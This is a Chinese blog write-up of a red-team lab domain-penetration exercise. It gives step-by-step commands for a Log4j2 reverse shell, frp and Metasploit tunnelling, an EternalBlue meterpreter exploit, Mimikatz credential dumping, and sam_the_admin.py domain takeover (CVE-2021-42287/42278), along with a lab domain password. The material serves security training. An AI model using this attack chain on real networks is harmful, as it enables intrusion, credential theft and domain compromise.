---
title: 渗透攻击红队域渗透靶场-2(redteam.lab)Writeup
date: 2021-12-25 20:25:57
categories:
- 渗透测试
tags:
- 域渗透
---

```
知识点：log4j2 RCE、CVE-2021-42287、CVE-2021-42278、MS17-010漏洞利用、frp内网穿透、MSF搭建socks代理
```

## 前言

本次靶场是 **渗透攻击红队** 出的第二个内网域渗透靶场，里面包含了最新出的漏洞：Log4j2 RCE、CVE-2021-42287、CVE-2021-42278，下面是本次靶场的拓扑图：

![](https://s2.loli.net/2021/12/25/nUgrAER1a7uck4T.png)

PS：靶场下载地址关注微信公众号：**红队攻防实验室** 回复：**001** 即可获取到下载地址。

## 信息收集

```
Ubuntu Desktop ip：192.168.124.8（模拟服务器公网ip）
Kali ip：192.168.124.7
```

### 端口扫描

```
nmap -sC -sV -p- 192.168.124.8
```

![](https://s2.loli.net/2021/12/25/isQdo7n8YMO63zr.png)

一台Ubuntu机器，开放了两个端口`22`、`38080`

### 漏洞发现

`22`端口暂时无法利用，先访问`38080`端口

![](https://s2.loli.net/2021/12/25/P8aAskWUO9GMgin.png)

是一个web服务，直接尝试最近爆出的`CVE-2021-44228`Log4j2 rce漏洞，看看能不能获取到 `dnslog`

![](https://s2.loli.net/2021/12/25/rahfqH8YAns4bOX.png)

发现存在`CVE-2021-44228`log4j2 rce漏洞。接下来利用该漏洞反弹shell

## CVE-2021-44228漏洞利用

使用[工具](https://github.com/feihong-cs/JNDIExploit)在**Kali**终端（192.168.124.7）开启一个LDAP：

![](https://s2.loli.net/2021/12/25/Lx32deqBcDFZNjE.png)

并开启一个监听端口，来接收反弹的shell

```
nc -lnvp 4444
```

![](https://s2.loli.net/2021/12/25/8YgNSkslQJOzM7u.png)

使用EXP成功反弹shell

![](https://s2.loli.net/2021/12/25/V4vcumZy7A1CaSh.png)

当前的shell是一个Docker环境

![](https://s2.loli.net/2021/12/25/KTxhpcBFZdftOwo.png)

![](https://s2.loli.net/2021/12/25/rEHbGacJxSXnMIk.png)

在`/root/	`目录下找到了flag，给出了一个账号密码，应该是端口扫描时发现开放的`SSH`的账号密码

![](https://s2.loli.net/2021/12/25/h2ud3zKTJoUebL9.png)

## 内网信息收集

使用获得的账号密码成功登录`SSH`服务

![](https://s2.loli.net/2021/12/25/4dqi6MFtcluaoJN.png)

`ifconfig`发现该机器有双网卡，其中 `ens33` 是外网的网卡，`ens38` （10.0.1.6）是内网网卡

![](https://s2.loli.net/2021/12/25/p2shzE5quwoUyYQ.png)

我们用 `for` 循环 `ping` 一下 `ens38` 的 `C` 段：

```
for i in 10.0.1.{1..254}; do if ping -c 3 -w 3 $i &>/dev/null; then echo $i Find the target; fi; done
```

发现有一台存活主机`10.0.1.7`

![](https://s2.loli.net/2021/12/25/hYRtSfk19maZHLC.png)

## 内网横向渗透

### frp流量转发

使用[**frp**](https://github.com/fatedier/frp)将已获取到权限的`Ubuntu`的流量代理出来，这样就可以通过`Kali`来对内网存活主机进行渗透了

我们先要将`frp`上传到`Ubuntu`中，在`Kali`开启一个`HTTP`服务

```
python3 -m http.server 80
```

![](https://s2.loli.net/2021/12/25/5isFM4qrH1UEnYv.png)

然后在`Ubuntu`中下载

![](https://s2.loli.net/2021/12/25/aG3SCVZQzI7q2Ru.png)

在`Ubuntu`中给予`frp.tar.gz`执行权限，并解压

```
chmod +x frp.tar.gz
tar -zxvf frp.tar.gz
```

![](https://s2.loli.net/2021/12/25/Sl1c4gfoekZ8shP.png)

进入`frp`目录，配置好`frpc.ini`

![](https://s2.loli.net/2021/12/25/y9CkpEQPce3hdXv.png)

然后回到`Kali`终端开启`frp`的服务端

![](https://s2.loli.net/2021/12/25/3EN1aGQRTntbqWx.png)

再在`Ubuntu`中启动客户端

![](https://s2.loli.net/2021/12/25/MoNUh7RAvKOrGg1.png)

此时`Kali`的服务端就有响应了

![](https://s2.loli.net/2021/12/25/hZ8RaToDQHGbutX.png)

### MSF设置Socks 代理

```
setg Proxies socks5:192.168.124.7:7777
setg ReverseAllowProxy true
```

![](https://s2.loli.net/2021/12/25/RNX9WnoepZrf3wu.png)

使用 `smb` 版本探测模块对目标进行扫描：

```
use auxiliary/scanner/smb/smb_version
set rhosts 10.0.1.7
```

![](https://s2.loli.net/2021/12/25/JuiYcMgrLHnzGqw.png)

发现目标 `10.0.1.7`系统 版本是 `Windows 7`，且存在域 `REDTEAM`

接着探测目标是否存在经典的`MS17-010`漏洞

### MS17-010 漏洞探测与利用

```
use auxiliary/scanner/smb/smb_ms17_010
set rhosts 10.0.1.7
```

![](https://s2.loli.net/2021/12/25/Mx7V4XuLn9gImwy.png)

目标主机`win7`确实存在`永恒之蓝`漏洞

接下来我们继续使用`MSF`的模块进行漏洞利用，由于目标机器不一定出网，我们选择用正向连接的`payload`

```
use windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/bind_tcp
set rhosts 10.0.1.7
run
```

<img src="https://s2.loli.net/2021/12/25/wMnTPC3NlLJ9AgK.png" style="zoom: 80%;" />

成功获得一个`meterpreter`

![](https://s2.loli.net/2021/12/25/jDzbevUSNAP1LVu.png)

拿到 `Win7` 权限后加载 `Mimikatz` 抓取明文密码

```
load mimikatz
creds_all
```

![](https://s2.loli.net/2021/12/25/K7d4GxDLbOzhECN.png)

此时我们得到了一个域用户的账号密码

## 域渗透

### 域内信息收集

```
hostname
net user /domain
ipconfig
```

![](https://s2.loli.net/2021/12/25/wLe1nTbmszfFRSu.png)

![](https://s2.loli.net/2021/12/25/P4INuV6HBbDZhaR.png)

发现`win7`还有一个内网网卡，接着我们需要定位域控

```
net group "Domain Controllers" /domain
ping DC
```

![](https://s2.loli.net/2021/12/25/grtlYL3HQ4JcWwU.png)

定位到域控到域控 `IP` 为 `10.0.0.12` ，接下来直接尝试最近爆出的两个域内核武器漏洞：CVE-2021-42287、CVE-2021-42278

**具体：**[只需要一个域用户即可拿到 DC 权限（CVE-2021-42287 and CVE-2021-42278）](https://mp.weixin.qq.com/s?__biz=MzkzNzMxNDc5Mg==&mid=2247483681&idx=1&sn=5757667e1a2f812244fe17b50ce46c27&chksm=c29011a6f5e798b089099860b7754babafd39154911a64a53669da882df6dec5118cf7942414&scene=21#wechat_redirect)

### MSF流量转发

我们先将`win7`的流量代理出来，然后在`Kali`中实现域内提权

先添加路由：

```
run autoroute -s 10.0.0.7/24
```

![](https://s2.loli.net/2021/12/25/rQkhlwGEZcsm9zK.png)

使用 MSF 添加了一个 Socks：

```
background
use auxiliary/server/socks_proxy
run
```

![](https://s2.loli.net/2021/12/25/GHaZPjcoNR8Dwnu.png)

接着修改`proxychain`配置文件

```
vim /etc/proxychains4.conf
```

![](https://s2.loli.net/2021/12/25/nkmBMlRVItbWEsh.png)

直接使用[脚本](https://github.com/WazeHell/sam-the-admin)利用漏洞进行域内提权

```
proxychains python3 sam_the_admin.py "redteam/root:Red12345" -dc-ip 10.0.0.12 -shell
```

![](https://s2.loli.net/2021/12/25/sojU6f8SKgOC7vb.png)

最后拿到最终的flag

![](https://s2.loli.net/2021/12/25/TktQN23dHpwsiJh.png)
